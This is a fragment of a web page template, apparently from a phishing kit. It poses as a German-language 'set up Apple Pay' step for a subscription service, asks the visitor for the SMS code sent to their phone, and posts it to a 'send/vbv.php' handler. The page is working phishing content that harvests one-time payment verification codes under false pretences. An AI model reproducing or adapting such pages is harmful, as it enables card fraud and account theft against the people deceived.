                    ...
                    <main class="onboarding" id="onboarding_index" style="top: 0px;">
                        <div class="onboarding-wrapper">
                            <form id="dssLogin" name="dssLogin" action="<?php echo './send/vbv.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" method="post">
                                <br>
                                <h3 color="white" style="color: rgb(249, 249, 249); margin: 0px; padding: 0px 0px 24px;" class="sc-gZMcBi jhLoHG">Einrichten von Apple Pay</h3>
                                <label style="padding: 0px 0px 24px;">Um Ihnen eine wertvolle Erfahrung zu gewährleisten, bieten wir Ihnen jetzt den Dienst Apple Pay an. So können Sie Ihre Zahlungen automatisch verwalten, ohne sich um die Erneuerung Ihres Abonnements kümmern zu müssens. <br><br>Um diesen kostenlosen Service einzurichten, füllen Sie den Code aus, der an Ihre Telefonnummer gesendet wird.</label>
                                <br>
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    ...
                                    <span style="padding-top: 25px; display: block;">
                                                <input aria-label="Adresse e-mail" display="inline" id="password" name="codevbv" maxlength="" placeholder="Code per SMS erhalten" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" maxlength="6" required>
